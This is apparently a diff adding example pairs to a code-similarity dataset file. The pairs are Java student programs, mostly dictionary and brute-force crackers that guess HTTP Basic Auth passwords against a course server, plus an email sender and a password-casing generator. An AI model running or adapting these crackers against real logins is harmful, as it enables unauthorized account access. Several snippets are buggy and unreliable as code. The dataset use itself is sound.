+      \      BufferedReader in = new BufferedReader(\n           new InputStreamReader\n              (connectURL(new URL(args[0]),\
+      \ args[1], args[2])));\n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n\
+      \           status = true;\n           }\n       }\n     catch (IOException e) {\n   \n       }\n     }\n\n   public\
+      \ InputStream connectURL (URL url, String uname, String pword)\n        throws IOException  {\n     conn = url.openConnection();\n\
+      \     conn.setRequestProperty (\"Authorization\",\n     userNamePasswordBase64(uname,pword));\n     conn.connect ();\n\
+      \     return conn.getInputStream();\n     }\n\n   public String userNamePasswordBase64(String username, String password)\
+      \ {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n   private final static char base64Array\
+      \ [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q',\
+      \ 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k',\
+      \ 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n \
+      \      '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n   private static String base64Encode (String string)    {\n\
+      \     String encodedString = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n \
+      \    while (i < bytes.length) {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length)\
+      \ {\n          b2 = 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n\
+      \          if (i >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n             }\n          else\n \
+      \            b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3)\
+      \ << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n\
+      \       encodedString += base64Array [c1];\n       encodedString += base64Array [c2];\n       switch (pad) {\n     \
+      \   case 0:\n          encodedString += base64Array [c3];\n          encodedString += base64Array [c4];\n          break;\n\
+      \        case 1:\n          encodedString += base64Array [c3];\n          encodedString += \"=\";\n          break;\n\
+      \        case 2:\n          encodedString += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n\
+      \   }\n }\n\n"
+    sentences:
+    - "import java.net.*;\nimport java.io.*;\n\n public class Dictionary {\n int attempts = 0;\n   URLConnection conn = null;\n\
+      \n   public static void main (String args[]){\n\n\tDictionary a = new Dictionary();\n     a.attack(args);\n     }\n\n\
+      \   public void attack(String args[]) {\n   try {\n       String login = new String(\"\");\n       String url = new\
+      \ String(\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n       String passwd = new String();\n\n\n       passwd\
+      \ = getPasswd();\n       BufferedReader in = new BufferedReader( new InputStreamReader (openURLForInput(new URL(url),\
+      \ login , passwd)));\n\n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n\
+      \           }\n           System.out.println(\"Password Cracked Successfully!!!\");\n           System.out.println(\"\
+      The passsword is :\" + passwd + \"and got after \" +attempts + \" tries\");\n       }\n     catch (IOException e) {\n\
+      \  \n      String r = new String(e.getMessage());\n    if ( r != null)\n    {\n     System.out.println(\"Message :\"\
+      \ +r);\n     Dictionary a = new Dictionary();\n     a.attack(args);\n    }\n     else\n     {\n\tSystem.out.println(\"\
+      Trying again\");\n\tDictionary a = new Dictionary();\n\ta.attack(args);\n     }\n     }\n   }\n  public String getPasswd()\n\
+      \  {\n\n int i=0;int j=0;\n attempts++;\n int count =0;\n System.out.println(\"Passing dictionary word and waiting for\
+      \ URL reply....... \");\n  String currentword = \"\";\n  String se = \"\";\n  try{\n FileInputStream reader = new FileInputStream\
+      \ (\"words\");\n DataInputStream in = new DataInputStream(reader);\n while (in.available() !=0)\n{\n currentword = in.readLine();\n\
+      \ count++;\n \n \n }\n }\n  catch( IOException e){}\n\n  return currentword;\n\t \n         }\n\n\n\n public InputStream\
+      \ openURLForInput (URL url, String uname, String pword)\n throws IOException  {\n     conn = url.openConnection();\n\
+      \     conn.setDoInput (true);\n     conn.setRequestProperty (\"Authorization\", userNamePasswordBase64(uname,pword));\n\
+      \     conn.connect ();\n     return conn.getInputStream();\n     }\n\n\n public String userNamePasswordBase64(String\
+      \ username, String password) {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n private\
+      \ final static char base64Array [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M',\
+      \ 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n \
+      \      'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y',\
+      \ 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n private static String base64Encode\
+      \ (String string)    {\n     String encodedString = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n\
+      \     int pad = 0;\n     while (i < bytes.length) {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n\
+      \       if (i >= bytes.length) {\n          b2 = 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else\
+      \ {\n          b2 = bytes [i++];\n          if (i >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n\
+      \             }\n          else\n             b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n  \
+      \     byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n  \
+      \     byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array [c1];\n       encodedString += base64Array [c2];\n\
+      \       switch (pad) {\n         case 0:\n          encodedString += base64Array [c3];\n          encodedString += base64Array\
+      \ [c4];\n          break;\n         case 1:\n          encodedString += base64Array [c3];\n          encodedString +=\
+      \ \"=\";\n          break;\n         case 2:\n          encodedString += \"==\";\n          break;\n        }\n    \
+      \   }\n       return encodedString;\n   }\n }\n\n"
+    - "import java.net.*;\nimport java.io.*;\n\n public class Bruteforce {\n int attempts = 0;\n  int l = 65;int m = 65;int\
+      \ n = 65;\n   URLConnection conn = null;\n\n   public static void  main(String args[]){\n     \n\tBruteforce a = new\
+      \ Bruteforce();\n        a.attack(args);\n     }\n\n   public void attack(String args[]) {\n   try {\n\n       String\
+      \ login = new String(\"\");\n       String url = new String(\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n  \
+      \     String passwd = new String();\n\n\t passwd = getPasswd();\n         BufferedReader in = new BufferedReader( new\
+      \ InputStreamReader (openURLForInput(new URL(url), login , passwd)));\n\n       String line;\n       while ((line =\
+      \ in.readLine()) != null) {\n           System.out.println(line);\n           }\n           System.out.println(\"Password\
+      \ Cracked Successfully!!!\");\n           System.out.println(\"The passsword is :\" + passwd + \"and got after \" +\
+      \ attempts + \" tries\");\n       }\n     catch (IOException e) {\n    \n      String r = new String(e.getMessage());\n\
+      \    if ( r != null)\n    {\n     System.out.println(\"Message :\" +r);\n     System.out.println(\"Trying again with\
+      \ new password\");\n     Bruteforce a = new Bruteforce();\n     a.attack(args);\n    }\n     else\n     {\n\tSystem.out.println(\"\
+      Trying again with new password\");\n\tBruteforce a = new Bruteforce();\n\ta.attack(args);\n     }\n     }\n   }\n  public\
+      \ String getPasswd()\n  {\n    attempts++;\n\n    char i1 = 0;\n    char j1 = 0;\n    char k1 = 0;\n    \n     int i=\
+      \ l;     int j= m;     int k= n;\n\n    String c = new String();\n    String c1 = new String();\n    String c2 = new\
+      \ String();\n    String c3 = new String();\n    String c4 = new String();\n    boolean flag;\n\n    for (i=l;i<123;i++)\n\
+      \    for (j=m;j<123;j++)\n    for (k=n;k<123;k++)\n    {\n        if( flag = true )\n        {\n\n    i1 = (char)i;\n\
+      \    j1 = (char)j;\n    k1 = (char)k;\n\n    if (i==91) i=97;\n    if (j==91) j=97;\n    if (k==91) k=97;\n\n    c =\
+      \ i1+\"\";\n    c1 = j1+\"\";\n    c2 = k1+\"\";\n    c3 = c.concat(c1);\n    c4 = c3.concat(c2);\n    }else break;\n\
+      \    }\n    flag = false;\n    return c4;\n  }\n\n public InputStream openURLForInput (URL url, String uname, String\
+      \ pword)\n throws IOException  {\n     conn = url.openConnection();\n     conn.setDoInput (true);\n     conn.setRequestProperty\
+      \ (\"Authorization\", PasswordBase64(uname,pword));\n     conn.connect ();\n     return conn.getInputStream();\n   \
+      \  }\n\n\n public String PasswordBase64(String username, String password) {\n     return \" \" + base64Encode (username\
+      \ + \":\" + password);\n     }\n\n private final static char base64Array [] = {\n       'A', 'B', 'C', 'D', 'E', 'F',\
+      \ 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n      \
+      \ 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q', 'r',\
+      \ 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+', '/'\n\
+      \  };\n\n private static String base64Encode (String string)    {\n     String encodedString = \"\";\n     byte bytes\
+      \ [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i < bytes.length) {\n       byte b1 = bytes\
+      \ [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n          b2 = 0;\n          b3 = 0;\n\
+      \          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n          if (i >= bytes.length) {\n \
+      \            b3 = 0;\n             pad = 1;\n             }\n          else\n             b3 = bytes [i++];\n      \
+      \    }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte c3 =\
+      \ (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array [c1];\n\
+      \       encodedString += base64Array [c2];\n       switch (pad) {\n         case 0:\n          encodedString += base64Array\
+      \ [c3];\n          encodedString += base64Array [c4];\n          break;\n         case 1:\n          encodedString +=\
+      \ base64Array [c3];\n          encodedString += \"=\";\n          break;\n        case  2:\n          encodedString\
+      \ += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n   }\n }\n"
+    - "import java.io.BufferedReader;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\
+      import java.util.Date;\nimport java.util.Properties;\n\nimport javax.mail.Message;\nimport javax.mail.Session;\nimport\
+      \ javax.mail.Transport;\nimport javax.mail.Message.RecipientType;\nimport javax.mail.internet.InternetAddress;\nimport\
+      \ javax.mail.internet.MimeMessage;\n\n\n\n\npublic class Mailsend\n{\n    static final String SMTP_SERVER = MailsendPropertyHelper.getProperty(\"\
+      smtpServer\");\n    static final String RECIPIENT_EMAIL = MailsendPropertyHelper.getProperty(\"recipient\");\n    static\
+      \ final String SENDER_EMAIL = MailsendPropertyHelper.getProperty(\"sender\");\n    static final String MESSAGE_HEADER\
+      \ = MailsendPropertyHelper.getProperty(\"messageHeader\");\n\n\n\t\n\n\tpublic static void main(String args[])\n\t{\n\
+      \t\ttry\n\t\t{\n\t\t\t\n\t\t\tString smtpServer = SMTP_SERVER;\n\t\t\tString recip = RECIPIENT_EMAIL;\n\t\t\tString\
+      \ from = SENDER_EMAIL;\n\t\t\tString subject = MESSAGE_HEADER;\n\t\t\tString body = \"Testing\";\n\n\t\t\tSystem.out.println(\"\
+      Started sending the message\");\n\t\t\tMailsend.send(smtpServer,recip , from, subject, body);\n\t\t}\n\t\tcatch (Exception\
+      \ ex)\n\t\t{\n\t\t\tSystem.out.println(\n\t\t\t\t\"Usage: java mailsend\"\n\t\t\t\t\t+ \" smtpServer toAddress fromAddress\
+      \ subjectText bodyText\");\n\t\t}\n\n\t\tSystem.exit(0);\n\t}\n\n\n\t\n\tpublic static void send(String smtpServer,\
+      \ String receiver,\tString from, String subject, String body)\n\n\t{\n\t\ttry\n\t\t{\n\t\t\tProperties props = System.getProperties();\n\
+      \n\t\t\t\n\n\t\t\tprops.put(\"mail.smtp.host\", smtpServer);\n\t\t\tprops.put(\"mail.smtp.timeout\", \"20000\");\n\t\
+      \t\tprops.put(\"mail.smtp.connectiontimeout\", \"20000\");\n\n\t\t\t\n\t\t\tSession session = Session.getDefaultInstance(props,\
+      \ null);\n\n\n\t\t\t\n\t\t\tMessage msg = new MimeMessage(session);\n\n\t\t\t\n\t\t\tmsg.setFrom(new InternetAddress(from));\n\
+      \t\t\tmsg.setRecipients(Message.RecipientType.NORMAL,\tInternetAddress.parse(receiver, false));\n\n\n\n\t\t\t\n\t\t\t\
+      msg.setSubject(subject);\n\n\t\t\tmsg.setSentDate(new Date());\n\n\t\t\tmsg.setText(body);\n\n\t\t\t\n\t\t\tTransport.send(msg);\n\
+      \n\t\t\tSystem.out.println(\"sent the email with the differences : \"+ + \"using the mail server: \"+ smtpServer);\n\
+      \n\t\t}\n\t\tcatch (Exception ex)\n\t\t{\n\t\t\tex.printStackTrace();\n\t\t}\n\t}\n}\n"
+  - source_sentence: "import java.net.*;\nimport java.io.*;\nimport java.*;\n\n public class Dictionary {\n\n   URLConnection\
+      \ conn = null;\n   private static boolean status = false;\n\n   public static void main (String args[]){\n     Dictionary\
+      \ a = new Dictionary();\n     String[] inp = {\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\",\n     \t\t\t\t \"\"\
+      ,\n     \t\t\t\t \"\"};\n     File file = new File(\"words\");\n     exit:\n     try {\n\t\t BufferedReader in = new\
+      \ BufferedReader(new FileReader(file));\n\t\t int attempt = 0;\n\t\t inp[2] = in.readLine();\n\t\t while (inp[2] !=\
+      \ null) {\n\t\n\t\t\t if (inp[2].length() <= 3) {\n\t\t\t \tattempt++;\n\t\t\t \ta.doit(inp);\n     \t\t \tif (status)\
+      \ {\n\t\t\t \t\t System.out.println(\"Crrect password is: \" + inp[2]);\n\t\t\t \t\t System.out.println(\"Number of\
+      \ attempts = \" + attempt);\n\t\t\t \t\t break exit;\n\t\t\t \t}\n\t\t \t }\n\t\t\t inp[2] = in.readLine();\n   \t\t\
+      }\n\t } catch (FileNotFoundException e1) {\n\t\t \n\t\tSystem.err.println(\"File not found: \" + file);\n\t} catch (IOException\
+      \ e2) {\n\t\t\n\t\te2.printStackTrace();\n\t}\n\n   }\n\n   public void doit(String args[]) {\n     \n     try {\n \
+      \      BufferedReader in = new BufferedReader(\n           new InputStreamReader\n              (connectURL(new URL(args[0]),\
+      \ args[1], args[2])));\n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n\
+      \           status = true;\n           }\n       }\n     catch (IOException e) {\n   \n       }\n     }\n\n   public\
+      \ InputStream connectURL (URL url, String uname, String pword)\n        throws IOException  {\n     conn = url.openConnection();\n\
+      \     conn.setRequestProperty (\"Authorization\",\n     userNamePasswordBase64(uname,pword));\n     conn.connect ();\n\
+      \     return conn.getInputStream();\n     }\n\n   public String userNamePasswordBase64(String username, String password)\
+      \ {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n   private final static char base64Array\
+      \ [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q',\
+      \ 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k',\
+      \ 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n \
+      \      '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n   private static String base64Encode (String string)    {\n\
+      \     String encodedString = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n \
+      \    while (i < bytes.length) {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length)\
+      \ {\n          b2 = 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n\
+      \          if (i >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n             }\n          else\n \
+      \            b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3)\
+      \ << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n\
+      \       encodedString += base64Array [c1];\n       encodedString += base64Array [c2];\n       switch (pad) {\n     \
+      \   case 0:\n          encodedString += base64Array [c3];\n          encodedString += base64Array [c4];\n          break;\n\
+      \        case 1:\n          encodedString += base64Array [c3];\n          encodedString += \"=\";\n          break;\n\
+      \        case 2:\n          encodedString += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n\
+      \   }\n }\n\n"
+    sentences:
+    - "import java.net.*;\nimport java.io.*;\n\n public class Bruteforce {\n int attempts = 0;\n  int l = 65;int m = 65;int\
+      \ n = 65;\n   URLConnection conn = null;\n\n   public static void  main(String args[]){\n     \n\tBruteforce a = new\
+      \ Bruteforce();\n        a.attack(args);\n     }\n\n   public void attack(String args[]) {\n   try {\n\n       String\
+      \ login = new String(\"\");\n       String url = new String(\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n  \
+      \     String passwd = new String();\n\n\t passwd = getPasswd();\n         BufferedReader in = new BufferedReader( new\
+      \ InputStreamReader (openURLForInput(new URL(url), login , passwd)));\n\n       String line;\n       while ((line =\
+      \ in.readLine()) != null) {\n           System.out.println(line);\n           }\n           System.out.println(\"Password\
+      \ Cracked Successfully!!!\");\n           System.out.println(\"The passsword is :\" + passwd + \"and got after \" +\
+      \ attempts + \" tries\");\n       }\n     catch (IOException e) {\n    \n      String r = new String(e.getMessage());\n\
+      \    if ( r != null)\n    {\n     System.out.println(\"Message :\" +r);\n     System.out.println(\"Trying again with\
+      \ new password\");\n     Bruteforce a = new Bruteforce();\n     a.attack(args);\n    }\n     else\n     {\n\tSystem.out.println(\"\
+      Trying again with new password\");\n\tBruteforce a = new Bruteforce();\n\ta.attack(args);\n     }\n     }\n   }\n  public\
+      \ String getPasswd()\n  {\n    attempts++;\n\n    char i1 = 0;\n    char j1 = 0;\n    char k1 = 0;\n    \n     int i=\
+      \ l;     int j= m;     int k= n;\n\n    String c = new String();\n    String c1 = new String();\n    String c2 = new\
+      \ String();\n    String c3 = new String();\n    String c4 = new String();\n    boolean flag;\n\n    for (i=l;i<123;i++)\n\
+      \    for (j=m;j<123;j++)\n    for (k=n;k<123;k++)\n    {\n        if( flag = true )\n        {\n\n    i1 = (char)i;\n\
+      \    j1 = (char)j;\n    k1 = (char)k;\n\n    if (i==91) i=97;\n    if (j==91) j=97;\n    if (k==91) k=97;\n\n    c =\
+      \ i1+\"\";\n    c1 = j1+\"\";\n    c2 = k1+\"\";\n    c3 = c.concat(c1);\n    c4 = c3.concat(c2);\n    }else break;\n\
+      \    }\n    flag = false;\n    return c4;\n  }\n\n public InputStream openURLForInput (URL url, String uname, String\
+      \ pword)\n throws IOException  {\n     conn = url.openConnection();\n     conn.setDoInput (true);\n     conn.setRequestProperty\
+      \ (\"Authorization\", PasswordBase64(uname,pword));\n     conn.connect ();\n     return conn.getInputStream();\n   \
+      \  }\n\n\n public String PasswordBase64(String username, String password) {\n     return \" \" + base64Encode (username\
+      \ + \":\" + password);\n     }\n\n private final static char base64Array [] = {\n       'A', 'B', 'C', 'D', 'E', 'F',\
+      \ 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n      \
+      \ 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q', 'r',\
+      \ 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+', '/'\n\
+      \  };\n\n private static String base64Encode (String string)    {\n     String encodedString = \"\";\n     byte bytes\
+      \ [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i < bytes.length) {\n       byte b1 = bytes\
+      \ [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n          b2 = 0;\n          b3 = 0;\n\
+      \          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n          if (i >= bytes.length) {\n \
+      \            b3 = 0;\n             pad = 1;\n             }\n          else\n             b3 = bytes [i++];\n      \
+      \    }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte c3 =\
+      \ (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array [c1];\n\
+      \       encodedString += base64Array [c2];\n       switch (pad) {\n         case 0:\n          encodedString += base64Array\
+      \ [c3];\n          encodedString += base64Array [c4];\n          break;\n         case 1:\n          encodedString +=\
+      \ base64Array [c3];\n          encodedString += \"=\";\n          break;\n        case  2:\n          encodedString\
+      \ += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n   }\n }\n"
+    - "\npublic class CasePasswords\n{\n\n    \n    static int verbose = CrackingConstants.quietMode;\n\n    \n\t\n\tpublic\
+      \ void CasePasswords()\n\t{\n    }\n\n\t\n\tpublic void CasePasswords(int inVerbose)\n\t{\n\t    verbose = inVerbose;\n\
+      \    }\n\n\t\n    public String [] createCasedPasswords( int leftIndex, int  midIndex, int rightIndex, String tail,\
+      \ String [] lowerChars, String [] upperChars, int scanType)\n    {\n        String [] casedPasswords = null;\n     \
+      \   \n        \n        \n        if(scanType == CrackingConstants.casedScan)\n            if(rightIndex > -1)\n   \
+      \         {\n                \n                casedPasswords = new String[8];\n            }\n            else if(midIndex\
+      \ > -1)\n            {\n                \n                casedPasswords = new String[4];\n            }\n         \
+      \   else\n            {\n                \n                casedPasswords = new String[2];\n            }\n        else\
+      \  \n        {\n            \n            casedPasswords = new String[1];\n        }\t\n                \n        \n\
+      \        \n        \n        if(scanType == CrackingConstants.casedScan)\n        {\n            if(rightIndex > -1)\n\
+      \            {\n                \n                casedPasswords[0] = lowerChars[leftIndex] + lowerChars[midIndex] +\
+      \ lowerChars[rightIndex];\n                casedPasswords[1] = upperChars[leftIndex] + upperChars[midIndex] + upperChars[rightIndex];\n\
+      \                casedPasswords[2] = lowerChars[leftIndex] + lowerChars[midIndex] + upperChars[rightIndex];\n      \
+      \          casedPasswords[3] = lowerChars[leftIndex] + upperChars[midIndex] + lowerChars[rightIndex];\n            \
+      \    casedPasswords[4] = upperChars[leftIndex] + lowerChars[midIndex] + lowerChars[rightIndex];\n                casedPasswords[5]\
+      \ = upperChars[leftIndex] + upperChars[midIndex] + lowerChars[rightIndex];\n                casedPasswords[6] = upperChars[leftIndex]\
+      \ + lowerChars[midIndex] + upperChars[rightIndex];\n                casedPasswords[7] = lowerChars[leftIndex] + upperChars[midIndex]\
+      \ + upperChars[rightIndex];\n            }\n            else if(midIndex > -1)\n            {\n                \n  \
+      \              casedPasswords[0] = lowerChars[leftIndex] + lowerChars[midIndex];\n                casedPasswords[1]\
+      \ = upperChars[leftIndex] + upperChars[midIndex];\n                casedPasswords[2] = lowerChars[leftIndex] + lowerChars[midIndex];\n\
+      \                casedPasswords[3] = lowerChars[leftIndex] + upperChars[midIndex];\n            }\n            else\n\
+      \            {\n                \n                casedPasswords[0] = lowerChars[leftIndex];\n                casedPasswords[1]\
+      \ = upperChars[leftIndex];\n            }\n        }\n        else\t\n        {\n            if(rightIndex > -1)\n \
+      \           {\n                \n                casedPasswords[0] = lowerChars[leftIndex] + lowerChars[midIndex] +\
+      \ lowerChars[rightIndex];\n            }\n            else if(midIndex > -1)\n            {\n                \n    \
+      \            casedPasswords[0] = lowerChars[leftIndex] + lowerChars[midIndex];\n            }\n            else\n  \
+      \          {\n                \n                casedPasswords[0] = lowerChars[leftIndex];\n            }\n        }\t\
+      \n        \n        \n        \n        \n        \n        if(\"\" != tail)\n        \tfor( i = 0; i < casedPasswords.length;\
+      \ i++)\n        \t\tcasedPasswords[i] += tail;\n                        \n\t    if(verbose  == CrackingConstants.verboseMode2)\n\
+      \t        printPasswords(casedPasswords);\n\n        return casedPasswords;\n    }  \n    \n\t\n    public String []\
+      \ createCasedPasswords(String candidate, int  scanType)\n    {\n        \n        int candLength = candidate.length();\n\
+      \        int arrayLength = 2 ^ candLength;\n        arrayLength = 1;\n        String [] shortCasedPasswords = new String[1];\n\
+      \        String [] casedPasswords = null;\n        char[] password = new char [candidate.length()];\n        \n    \
+      \    \n        if(scanType != CrackingConstants.simpleScan)\n            candidate.getChars(0, candidate.length(), password,\
+      \ 0);\n        \n        \n        \n        \n        \n        \n        \n        \n        \n        \n        if(scanType\
+      \ == CrackingConstants.simpleScan)\n        {\n            \n            \n            casedPasswords = new String[1];\n\
+      \            casedPasswords[0] = candidate;\n        }\n        else if(candidate.length() == 1)\n        {\n      \
+      \      casedPasswords = new String[2];\n            casedPasswords[0] = Character.toString(Character.toLowerCase(password[0]));\n\
+      \            casedPasswords[1] = Character.toString(Character.toUpperCase(password[0]));\n            \n        }\n\
+      \        else if (candidate.length() == 2)\n        {\n            casedPasswords = new String[4];\n            casedPasswords[0]\
+      \ = Character.toString(Character.toLowerCase(password[0])) + Character.toString(Character.toLowerCase(password[1]));\n\
+      \            casedPasswords[1] = Character.toString(Character.toUpperCase(password[0])) + Character.toString(Character.toUpperCase(password[1]));\n\
+      \            casedPasswords[2] = Character.toString(Character.toLowerCase(password[0])) + Character.toString(Character.toUpperCase(password[1]));\n\
+      \            casedPasswords[3] = Character.toString(Character.toUpperCase(password[0])) + Character.toString(Character.toLowerCase(password[1]));\n\
+      \            \n        }\n        else if (candidate.length() == 3)\n        {\n            casedPasswords = new String[8];\n\
+      \            casedPasswords[0] = Character.toLowerCase(password[0]) + Character.toString(Character.toLowerCase(password[1]))\
+      \  + Character.toLowerCase(password[2]);\n            casedPasswords[1] = Character.toUpperCase(password[0]) + Character.toString(Character.toUpperCase(password[1]))\
+      \  + Character.toUpperCase(password[2]);\n            casedPasswords[2] = Character.toLowerCase(password[0]) + Character.toString(Character.toLowerCase(password[1]))\
+      \  + Character.toUpperCase(password[2]);\n            casedPasswords[3] = Character.toLowerCase(password[0]) + Character.toString(Character.toUpperCase(password[1]))\
+      \  + Character.toLowerCase(password[2]);\n            casedPasswords[4] = Character.toUpperCase(password[0]) + Character.toString(Character.toLowerCase(password[1]))\
+      \  + Character.toLowerCase(password[2]);\n            casedPasswords[5] = Character.toUpperCase(password[0]) + Character.toString(Character.toUpperCase(password[1]))\
+      \  + Character.toLowerCase(password[2]);\n            casedPasswords[6] = Character.toUpperCase(password[0]) + Character.toString(Character.toLowerCase(password[1]))\
+      \  + Character.toUpperCase(password[2]);\n            casedPasswords[7] = Character.toLowerCase(password[0]) + Character.toString(Character.toUpperCase(password[1]))\
+      \  + Character.toUpperCase(password[2]);\n            \n        }\n        else if (candidate.length() > 3)\n      \
+      \  {\n            casedPasswords = new String[8];\n            String tailCharacters = new String(password, 3, (password.length\
+      \ - 3));\n            casedPasswords[0] = Character.toString(Character.toLowerCase(password[0])) + Character.toString(Character.toLowerCase(password[1]))\
+      \  + Character.toString(Character.toLowerCase(password[2])) + tailCharacters;\n            casedPasswords[1] = Character.toString(Character.toUpperCase(password[0]))\
+      \ + Character.toString(Character.toUpperCase(password[1]))  + Character.toString(Character.toUpperCase(password[2]))\
+      \ + tailCharacters;\n            casedPasswords[2] = Character.toString(Character.toLowerCase(password[0])) + Character.toString(Character.toLowerCase(password[1]))\
+      \  + Character.toString(Character.toUpperCase(password[2])) + tailCharacters;\n            casedPasswords[3] = Character.toString(Character.toLowerCase(password[0]))\
+      \ + Character.toString(Character.toUpperCase(password[1]))  + Character.toString(Character.toLowerCase(password[2]))\
+      \ + tailCharacters;\n            casedPasswords[4] = Character.toString(Character.toUpperCase(password[0])) + Character.toString(Character.toLowerCase(password[1]))\
+      \  + Character.toString(Character.toLowerCase(password[2])) + tailCharacters;\n            casedPasswords[5] = Character.toString(Character.toUpperCase(password[0]))\
+      \ + Character.toString(Character.toUpperCase(password[1]))  + Character.toString(Character.toLowerCase(password[2]))\
+      \ + tailCharacters;\n            casedPasswords[6] = Character.toString(Character.toUpperCase(password[0])) + Character.toString(Character.toLowerCase(password[1]))\
+      \  + Character.toString(Character.toUpperCase(password[2])) + tailCharacters;\n            casedPasswords[7] = Character.toString(Character.toLowerCase(password[0]))\
+      \ + Character.toString(Character.toUpperCase(password[1]))  + Character.toString(Character.toUpperCase(password[2]))\
+      \ + tailCharacters;\n            \n        }\n        \n\t    if(verbose == CrackingConstants.verboseMode2)\n\t    \
+      \    printPasswords(casedPasswords);\n\n        return casedPasswords;\n    }\n    \n   \n\t\n    private void printPasswords(String\
+      \ [] passwords)\n    {\n        if(passwords.length > 0)\n        {\n           for( i = 0; i < passwords.length; i++)\t\
+      \n           {\n                System.out.print(passwords[i] + \"\\t\");\n           }\n           System.out.println(\"\
+      \\n\");\n        }\n    }  \n    \n} \n"
